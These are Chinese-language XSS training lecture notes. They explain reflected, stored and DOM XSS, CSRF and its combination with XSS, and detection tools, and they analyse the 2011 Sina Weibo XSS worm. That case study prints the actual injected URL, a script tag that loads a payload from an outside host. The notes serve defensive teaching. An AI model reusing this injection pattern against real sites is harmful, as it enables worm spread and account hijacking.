![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112727.jpg)

通过URL参数传递XSS攻击代码，攻击者构造恶意链接诱骗用户点击，

实现跨站脚本攻击。

---

      有的网站可能会将URL参数直接反射到页面上，如果网站没有对URL参数进行充分的过滤和转义，攻击者就可以在URL中注入恶意脚本，然后诱导我们用户点击这个链接，也是现在比较流行的方式。
      当用户访问包含恶意脚本的URL时，恶意脚本会执行，被发送到服务器并反射回用户的浏览器执行。
————————————————————————————————————————————————————————
反射型已经讲完了，看一下本地的测试程序，是php写，先演示一下几个脚本，演示一下几种利用反射型进行攻击的几种方式。
ascii是unicode的子集，unicode出现的晚\u006a是16进制的0*16的3+0*16的2次方+6*16+10*16的零次方=106 ascii码是j
&#106;
\u在js起作用，但是html只有&#起作用，作用域不同

# XSS – 存储型

__2\.存储型__  __XSS（__  <span style="color:#FF0000">持久型</span>  <span style="color:#FF0000">XSS</span>  __）__

攻击者将恶意代码提交到网站 <span style="color:#FF0000">数据库</span> 中，如个人信息或发表文章等地方。

当其他用户访问这些包含恶意代码的页面时，恶意代码会被执行。

这种攻击方式更为危险，因为它具有 <span style="color:#FF0000">持久性</span> ，且容易造成蠕虫，大量盗窃cookie等敏感信息。

---

什么叫持久型？
持久型，会把攻击者的数据存储在服务器端的数据库或其它存储，攻击行为将伴随着攻击数据一直存在。


# XSS – 存储型攻击流程

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112728.png)

---

我们看一下黑客利用存储型攻击的流程
       那么黑客检利用某些技术手段检测我们的程序是有问题的，写一个恶意脚本。
1.然后我们看第一条，黑客会利用这个注入点去将自己的恶意脚本注入，因为没有对这些脚本有过滤转义，那么这个恶意脚本就存储到我们的数据库中。2.我们的用户在这个时候，正好访问刚才黑客存的恶意脚本的页面。
3.此时这个页面也正常的是从服务端响应到了我们的浏览器，我们用户此时也是没有察觉，可能以为恶意脚本是正常的内容。
4.同时呢，用户的浏览器也正在解析这个页面的恶意脚本，这个脚本黑客采集到了我们用户的重要数据，同样是发送到了恶意的服务器。
5.黑客就可以从自己的服务器当中获取用户的一些隐私数据。
——————————————————————————————————————————————————————
      那我们平时经常会使用富文本，这个标签包含了一些样式，实现的时候不可能对特殊符号全部过滤，怎么去解决富文本带来的xss隐患呢。这个时候我们一般的解决方案呢，可能会引用一些流行的富文本编辑器，像UEditor、CKEditor等等
那这些富文本编辑器呢内部呢都是有严格的HTML过滤策略。
1.标签白名单：许多富文本编辑器只允许安全的HTML标签和属性。常用标签如 <b>、<i>、<p>、<ul>、<li> 等会被允许，
但 <script>、<iframe>、<style> 等标签则会被过滤。
2.属性白名单：仅允许常用属性（如 href、src），并禁止一切可能引入JavaScript的属性（如 onload、onclick 等）。
   还有特殊的URL过滤：对于链接或图片的 href 和 src 属性，比如<a>里，会检测是否包含 javascript: 协议，因为这个协议会执行js脚本，避免注入攻击。有的还会把 <script> 标签中的内容会被转义为纯文本，以防止被浏览器执行。

# XSS – 存储型特点

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112729.jpg)

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112730.jpg)

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112731.jpg)

---

     1.存储型 XSS 的恶意代码被永久存储在服务器上（如数据库），因此一旦被注入，它将持续存在，直到被删除或修改。攻击者只需一次提交恶意脚本，之后该脚本会在所有访问相关页面的用户中执行，造成长期威胁。
     2.通常难以被用户和网站管理员发现，因为恶意代码被混合在合法用户内容中,用户可能在不知情的情况下执行这些代码。
     3.任何访问被感染页面的用户都可能受到攻击，这可能导致大量用户同时受到影响。
比如：在一个社交媒体网站上，如果攻击者成功在一个公开的帖子中注入恶意代码，所有查看该帖子的人都可能被攻击，攻击者能够窃取这些用户的信息。

# XSS – 存储型适用情况

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112732.jpg)

用户输入未过滤，导致XSS攻击，影响网站安全及用户隐私。

---

1.在用户留言板、博客评论系统或任何允许用户发表评论和留言的地方，攻击者可以提交包含恶意脚本的留言或评论
2.这些恶意脚本被存储在服务器的数据库中。
3.当其他用户浏览这些留言或评论时，恶意脚本会在他们的浏览器中执行，从而触发攻击。
4.这种攻击方式可以窃取用户的敏感信息、伪造网页内容或进行其他恶意活动。

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112733.jpg)

用户发帖时，恶意脚本被存储于服务器，其他用户浏览帖子时，恶意脚本被执行，导致XSS攻击。

---

1.论坛和社交媒体平台也是XSS存储型攻击的常见目标。
2.攻击者可以在帖子、回复或社交媒体消息中嵌入恶意脚本，并等待其他用户查看这些内容。
3.由于这些平台通常具有高度的用户互动性和内容生成能力，因此攻击者可以利用这些特性来扩大攻击范围和影响。
————————————————————————————————————————————
存储型已经讲完了，看一下本地的测试程序
php写，先演示一下脚本，开启镜像模式，演示完毕关闭镜像模式。


# XSS – DOM型

__3\.DOM__  __型__  __XSS__

<span style="color:#FF0000">特殊的反射型</span> ，基于文档对象模型（Document Object Model）的一种漏洞，攻击者通过修改页面的DOM节点数据信息来形成XSS攻击。

实际上就是前端 JavaScript 代码不够严谨，把不可信的内容插入到了页面

这种攻击方式往往 <span style="color:#FF0000">不需要与服务器</span> 进行交互，直接在前端执行恶意代码。

---

虽然他是特殊的反射型，但它主要发生在客户端的浏览器上
1.在这种攻击中，攻击者利用URL中的恶意参数或直接在网页中执行 JavaScript 代码，通常是通过动态更新页面内容。
2.JavaScript 可以在网页加载后通过 DOM 操作来修改页面元素，比如修改文本、添加新元素等等。

__什么是__  __DOM?__

<span style="color:#FF0000">DOM（Document Object Model，文档对象模型）</span> 是一个与平台和语言无关的接口，它允许程序和脚本动态地访问和更新文档的内容、结构和样式。DOM 是将文档（如 HTML 或 XML 文件）视为一个结构化的集合，这个集合由节点（nodes）组成，包括元素（elements）、属性（attributes）、文本（text）等。HTML的标签都是节点，而这些节点组成了DOM的整体结构—— <span style="color:#FF0000">节点树</span> 。通过HTML DOM，树中的所有结点均可通过JavaScript进行访问。所有HTML元素\(节点\)均可被修改，也可以创建或删除节点。

---

理解为一棵树的概念，也可以理解为对象结构。
那么说到了dom型xss，那到底什么是dom呢

在网站页面中有许多元素，当页面到达浏览器时，浏览器会为页面创建一个项级的Document object文档 <span style="color:#FF0000">对象</span> ，接着生成各个 <span style="color:#FF0000">子文档对象</span> ，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑，从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM动态修改页面内容，从客户端获取DOM中的数据并在本地执行。由于DOM是在 <span style="color:#FF0000">客户端</span> 修改节点的，所以基于DOM型的XSS漏洞不需要与服务器端交互，它只发生在客户端处理数据的阶段。

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112734.png)

---

1.我们由概念转向图，更直观的看一下dom的结构
2.首先页面一个项级的Document文档对象，一个根元素的html标签.根元素上还有叶子元素，逐层的展开，形成一个大的节点树
4.这其中还包括了元素的一些属性、文本等等、然后我们通过js脚本或者插件类型去操作这些元素

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112735.png)

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112736.png)

---

1.<input> 标签这是HTML中经常出现的，用于收集用户输入的标签。
2.这个标签的属性是text，说明这是一个普通输入文本，还可能有像password，submit提交按钮等。
3.id属性为这个元素提供了一个唯一的标识符，在DOM中，这个ID可以用于通过JavaScript选择这个特定的元素
例如document.getElementById("name")这个方法
4.oninput="validateInput()"：这是一个事件属性，每当输入框的内容发生变化就会立即触发对应的函数。
在这个例子中，每当用户在输入框中输入或删除字符时，都会调用名为validateInput的JavaScript函数。
这个函数就是用于验证用户输入的内容是否符合某些规则或条件。

# XSS – DOM型攻击流程

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112737.jpg)

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112738.png)

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112739.jpg)

恶意脚本在DOM中执行，导致攻击

---

1. 攻击者构造恶意输入，攻击者首先会构造包含恶意脚本的输入数据。这些恶意脚本可能通过URL参数、表单提交或其他显示输入方式被嵌入到Web应用程序中。
2. 用户触发 用户通过访问包含恶意输入的页面或链接，触发攻击。用户的浏览器在解析HTML并构建DOM树的过程中，如果这些脚本没有被适当地过滤或转义，会处理这些恶意输本，它们就会在用户的浏览器中执行。
3.恶意脚本可以通过JavaScript动态修改DOM树，执行其中的恶意代码，从而实现攻击目的。
4. 攻击成功,一旦恶意脚本执行，攻击者就可以实现其攻击目标，为所欲为了。

# XSS – DOM型攻击特点

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112740.jpg)

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112741.png)

无需服务器处理，直接在客户端执行

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112742.png)

服务器日志无异常，难以检测和追踪

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112743.png)

常利用JavaScript、插件动态生成内容

---

我们看一下dom型的特点
1.DOM型攻击完全在客户端（浏览器）内执行，不涉及服务器的直接响应。这意味着攻击脚本通常在页面加载后，通过JavaScript处理动态内容时被触发。
2.同时具有很高的隐蔽性，正因为它在页面加载后的客户端环境中动态执行，不会在服务器端直接暴露出恶意代码，服务器几乎无法察觉，给受害者带来了较大隐患。
3.它依赖动态内容的处理，特别是浏览器对动态生成或操作DOM节点的处理机制。
4.其实许多DOM型XSS漏洞是由于开发者在处理用户输入时缺乏安全意识，未能正确验证或清理输入内容；在某些情况下，用户与页面的互动（如点击一个按钮）会触发脚本执行，增加了攻击的隐蔽性。

# XSS – DOM型适用情况

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112744.jpg)

---

说完了dom型的特点，我们看一下适用情况。
那这种情况呢
       像前端渲染框架，通常出现在基于 JavaScript 的前端渲染应用程序中，比如适用一些框架，React、Vue.js构建的单页面应用中;
       浏览器URL中的数据处理可能有问题：是当页面通过 URL 参数等方式传递用户输入，并直接在 DOM 中操作这些数据时，容易发生dom型xss；
      和反射有时候的场景很像，但是它的原因主要是前端处理不当导致的。

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112745.jpg)

网页动态加载数据，如用户评论、搜索建议等，若未正确过滤，易导致DOM型XSS。

---

第二种情况是
      客户端 JavaScript 操作 DOM 内容，用户生成的内容直接在客户端动态展示、如果 JavaScript 代码直接将用户输入的数据插入 DOM，而没有进行适当的验证或编码，可能会引发 DOM 型 XSS。一些常见的js方法包括 innerHTML、document.write，这些方法都会执行传入的字符串。
     这种动态内容加载技术虽然可以优化页面加载速度和用户体验。但是，它也可能成为了DOM型XSS攻击的利用点。
————————————————————————————————————————————————————————
dom型已经讲完了，看一下本地的测试程序
php写，先演示一下两个脚本，演示时切到镜像模式，演示后关闭镜像模式

# XSS – 总结

总结：三种 XSS 的区别

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112746.png)

每种 XSS 类型都有其不同的攻击途径和利用场景。对于开发者来说，了解这些差异可以帮助设计有效的防御措施，或者使用相对应的工具等。

---

      经过刚才的学习和实践，我们总结了三种xss类型的特点和区别。
      我们从攻击方式、危害范围以及相关的案例等一些方面介绍了这几种类型，每种 XSS 类型都有各自不同的攻击途径和利用场景，但这些呢都能对用户数据和Web应用的安全构成严重威胁。
     理解每种 XSS 的特点可以帮助咱们开发者更有针对性地、加强应用的安全性。

XSS组合利用

03

---

介绍了这么多的背景和概念，终于到了我们今天的主角，也就是我们的xss，我们首先看一下XSS的概念

# XSS – CSRF定义

<span style="color:#FF0000"> </span>  <span style="color:#FF0000">CSRF</span> （Cross\-Site Request Forgery，跨站请求伪造）是一种网络攻击技术，攻击者 <span style="color:#FF0000">诱导</span> 用户浏览器在 <span style="color:#FF0000">受信任</span> 的 <span style="color:#FF0000">服务器</span> 上发送恶意请求，从而执行未授权的操作。这种攻击利用了Web应用程序对用户身份验证状态的依赖，以及用户浏览器自动发送包含身份验证信息的请求（如Cookies和HTTP认证信息）的特性。

在CSRF攻击中，攻击者通常不会直接窃取用户的敏感信息，而是 <span style="color:#FF0000">利用用户的身份</span> 和权限来执行恶意操作。这些操作可能包括更改用户设置、发送未经授权的消息或电子邮件、执行转账等敏感动作。

# XSS – CSRF关键特性

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112747.jpg)

攻击者无法直接获取用户的登录信息或会话凭证，但可以借助用户的登录状态。用户的浏览器会自动附带身份验证信息（如 Cookie）到目标服务器。

攻击者构造一个请求，让用户无意中触发（如点击链接、加载图片、提交表单）。伪造的请求被认为来自合法用户，因为它携带了用户的身份凭证。

攻击在服务器，认为请求来自合法用户，因此执行操作。

# XSS – CSRF攻击类型

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112748.jpg)

仅仅须要一个HTTP请求，就能够构造一次简单的CSRF。

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112749.png)

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112750.jpg)

这种类型通常使用的是一个自动提交的表单。

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112751.png)

访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。

---

比如第一个，get型的
1.首先,你登录了银行站点A,然后访问了危急站点B,这时你会发现你的银行账户少了1000块。为什么会这样呢？原因是银行站点A违反了HTTP规范，使用GET请求更新资源。
2.在访问危急站点B的之前，你已经登录了银行站点A，而B中的一个合法的请求，但这里被不法分子利用了）。
3.所以浏览器会带着银行站点A的Cookie发出Get请求，去获取资源，以GET的方式请求银行站点了，结果银行站点服务器收到请求后，觉得这是一个更新资源操作（转账操作），所以就立马进行转账操作。所以怎么防御或者是开发角度来讲，一定不要用get请求做更新的一些操作。
——————————————————————————————————————————————————————————————————————————

# XSS – CSRF攻击流程

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112752.png)

---

       1.用户用设备通过浏览器登录了webA
       2.在用户输入用户名密码信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；
       3.用户没有退出网站A之前，在同一浏览器中，（可能被使用钓鱼的方式），然后点击奇怪的链接打开一个TAB页访问网站B；
       4.网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；
       5.浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带了Cookie信息，向网站A发出请求。
       6.网站A并不知道该请求其实是由B发起的，所以会根据我们用户的Cookie信息并且以用户的权限处理该请求，导致来自网站B的恶意代码被执行。
从上面的流程可以看出，想要达成CSRF攻击，必须达到两个基本条件：
     a.登录受信任站点A，并在本地生成Cookie。
     b.在不登出A的情况下，訪问危急站点B。  

# XSS – CSRF防御方法

_1\.验证HTTP Referer字段_

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112753.png)

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112754.png)

服务器端生成的唯一的值，并发送到客户端，并在客户端随后发起的请求中包含该Token。

使用方便，开发简单，一定程度上能预防CSRF攻击；完全依托于浏览器，Referer字段容易被故意篡改。

_4\.使用 SameSite Cookie_

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112755.png)

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112756.png)

通过设置Cookie的SameSite 属性，限制Cookie在跨站请求中发送。

在敏感操作（如转账、密码修改等）前要求用户输入验证码，以增加攻击者自动化攻击的难度。

---

 在HTTP请求头的Referer字段，它记录了该HTTP 请求的来源地址，存储型的时候也说过这个字段。
——————————————————————————————————————————————————————————
1.CSRF Token是由服务器端应用程序生成的唯一的、秘密的、不可预测的值，发送到客户端，并在客户端随后发起的请求中包含该Token。
2.服务器端应用程序会验证请求是不是包含预期的Token，如果Token缺失或无效，则拒绝请求。
那么这种方式也是现在开发时候比较主流的方式，像java里的spring security框架，就是用的这种方式。
——————————————————————————————————————————————————————————

# XSS – CSRF组合利用

利用XSS漏洞窃取受害者的会话Cookie，攻击者就可以伪装成受害者，并尝试执行任何受害者可以执行的操作。

注入的恶意脚本窃取CSRF Token，构造CSRF攻击，因为已经通过身份验证，浏览器会自动包含正确的CSRFToken在请求中。

XSS 漏洞允许攻击者修改页面 DOM，从而改变表单的提交目标或插入伪造参数。

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112757.jpg)

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112758.jpg)

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112759.jpg)

---

那么xss和csrf有什么关系呢？
XSS攻击可以作为CSRF攻击的前置步骤或辅助手段。或者说xss是实现csrf的诸多手段的一种。
—————————————————————————————————————————

XSS案例分析

04

# XSS – 经典案例

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112760.jpg)

<span style="color:#262626">在2011年6月28日晚，</span>  <span style="color:#262626">\*</span>  <span style="color:#262626">浪微博遭遇了一次严重的XSS安全事件。在不到一个小时的时间，超过3万微博用户的账户自动发送了一系列异常信息，例如："郭美</span>  <span style="color:#262626">\*</span>  <span style="color:#262626">事件背后的未公开细节"、"建</span>  <span style="color:#262626">\*</span>  <span style="color:#262626">大业中的视觉错误"、"触动女性心灵的100句诗歌精选"、"高清版3D肉</span>  <span style="color:#262626">\*</span>  <span style="color:#262626">团种子"，以及"疑似神仙眷侣的惊人揭秘"，还有"范</span>  <span style="color:#262626">\*\*</span>  <span style="color:#262626">艳照流出的惊人爆料"，并且这些用户还自动关注了一个名为hellosamy的账号。</span>

<span style="color:#262626">     </span>  <span style="color:#262626">事件的经过线索如下：</span>

<span style="color:#262626">     </span>  <span style="color:#262626"> __20:14__ </span>  <span style="color:#262626"> __   __ </span>  <span style="color:#262626"> __许多具有认证标识的用户不幸被病毒感染，开始转发带有恶意蠕虫的帖子。__ </span>

<span style="color:#262626">     </span>  <span style="color:#262626"> __20:30__ </span>  <span style="color:#262626"> __   __ </span>  <span style="color:#262626"> __受影响的用户试图访问一个网站时，发现该页面已经无法打开，显示出病毒的痕迹。__ </span>

<span style="color:#262626">     </span>  <span style="color:#262626"> __20:32__ </span>  <span style="color:#262626"> __   __ </span>  <span style="color:#FF0000"> __hellosamy__ </span>  <span style="color:#262626"> __用户的账户也因安全问题暂时无法访问。__ </span>

<span style="color:#262626">     </span>  <span style="color:#262626"> __21:02__ </span>  <span style="color:#262626"> __   \*__ </span>  <span style="color:#262626"> __浪官方漏洞修补完毕。__ </span>

<span style="color:#262626"> </span>  <span style="color:#262626">    </span>  <span style="color:#FF0000"> __影响有多大：32961（这位hellosamy在帐号被封前的好友数量）。__ </span>

---

只有短短的不到20多分的时间，影响非常的大。

官方处理应急响应还是非常迅速的,所以看出来网络安全领域里应急响应的重要性。

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112761.png)

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112762.png)

---

历史快照，网上找到的2011年pc端的一些截图，当年的智能手机正处于爆发初期，大家还是都集中在PC端去网上冲浪、游戏等等。
这些照片大家可以看一下，图非常模糊，都是一些及其炸裂、惊爆眼球的微博文章。
大家可以着重看一下这个链接，等会我们会详解一下黑客的操作行为。

1\.黑客发现漏洞，并通过对\*浪微博某个页面 http://weibo\.com/XX/XX 的一个URL注入了可控制的js脚本。

2\.通过 <span style="color:#FF0000">http://163\.fm/PxZHoxn</span> 短链接服务，将链接指向http://weibo\.com/pub/star/g/xyyyd%22%3E%3Cscript%20src=//www\.2kt\.cn/images/t\.js%3E%3C/script%3E?type=update （ <span style="color:#FF0000">\<script src=//www\.2kt\.cn/images/t\.js>\</script></span> ）

3\.黑客自己让自己“中毒”，发微博并且发私信的方式诱惑用户去点击脚本链接，尤其是针对V标认证的用户，如果此类用户中毒，必然可以实现大范围、快速的传播。

4\.当大量的加V认证账户和其他普通用户中毒后，这些用户就会通过发微博和发私信的方式将该XSS蠕虫向其他用户进行传播，进而导致了该XSS蠕虫的大范围、快速的传播与感染。

---

xss蠕虫是带传播性的，和普通xss攻击区别是普通的可能只会盗取你的相关隐私，或者做一些其它的操作
类似于病毒。

1\.发表一篇微博信息，微博的题目为随机题目，且这些题目均为目前网络环境中比较热门或有争议的题目，如“郭美\*事件的一些未注意到的细节”、“建\*大业中穿帮的地方”、“让女人心动的100句诗歌”等。如此热门的题目也必然会 引来更多的XSS蠕虫攻击受害者。

2\.就是关注恶意攻击者的微博账号，该账户就为此次攻击事件的操纵者，即名称为 <span style="color:#FF0000">hellosamy</span> 的用户。

3\.通过私信的方式发送给受攻击账户的好友，将这些带毒链接进行传播。

---

代码只有三个主要功能
指数级的传播

初步发现 Chrome 和 Safari 都没中招。IE、Firefox未能幸免。

史上最著名的XSS攻击是Yahoo Mail 的Yamanner 蠕虫是一个著名的XSS 攻击实例。早期Yahoo Mail 系统可以执行到信件内的javascript 代码。并且Yahoo Mail 系统使用了Ajax技术，这样病毒javascript 可以的向Yahoo Mail 系统发起ajax 请求，从而得到用户的地址簿，并发送攻击代码给他人。

为什么那个用户叫hellosamy，因为samy是第一个XSS攻击性的蠕虫病毒，在MySpace上传播。

---

1.myspace这一事件发生在2005年，Samy利用MySpace平台上的一个XSS漏洞，成功发起了蠕虫攻击。
2.Samy在短短几小时内就感染了MySpace上的100万用户，为其作者新增加了100 万好友。
3.是持久型XSS蠕虫的一个例子，Samy作为Web安全史上第一个重量级的XSS蠕虫，具有里程碑意义。

XSS检测方法

05

---

我们学习了xss的原理和相关类型和真实案例之后，我们大家一起学习一下检测xss的方法。

# XSS – 检测方法

例如  <span style="color:#FF0000">Fortify</span>  <span style="color:#FF0000">、</span>  <span style="color:#FF0000">SonarQube</span> 、 <span style="color:#FF0000">Checkmarx </span> 等安全工具可以扫描代码并标记潜在的漏洞。

寻找未经过滤或未转义的用户输入，可能被插入到 HTML 或 JavaScript 代码中，成为 XSS 攻击的入口

---

静态代码分析其实就是我们的代码审计，这个过程不执行代码，而是通过对源代码的静态检查来检测潜在的 XSS 漏洞。
有代码审计工具 fortity，sonar等等
这些工具都是检查一些代码基本逻辑，无用代码等、危险函数，代码审计的重要性也是不言而喻，避免我们的程序在上线之前就有问题，保证了我们系统的可用性。

可能产生误报，不能检测到某些复杂场景中的动态生成代码

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112763.jpg)

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112764.jpg)

---

静态代码分析的好处有很多，首先不需要运行程序，在开发阶段、代码编写时就可以发现潜在的漏洞；静态分析可以遍历所有代码路径，包括很难通过手动测试覆盖到的路径，帮助我们发现隐藏的XSS漏洞，减少问题进入到生产环境的风险。
—————————————————————————————————————————————————————————————————
但是它也有相应的缺点，静态分析可能会生成大量误报，包括一些不是真正安全问题的警告，咱们开发人员需要手动检查和筛选，增加了咱们维护的成本；还有像一些复杂的这个编码逻辑，比如在动态生成HTML内容的时候，涉及到的复杂的数据转义操作，静态分析工具有时难以准确识别。

使用 <span style="color:#FF0000">Selenium</span> 等工具模拟用户输入，尝试在执行过程中引发 XSS 攻击。

例如  <span style="color:#FF0000">Burp Suite</span> 、 <span style="color:#FF0000">OWASP ZAP</span> 等，这类工具会主动向应用发送模拟攻击请求，尝试诱发XSS攻击。

---

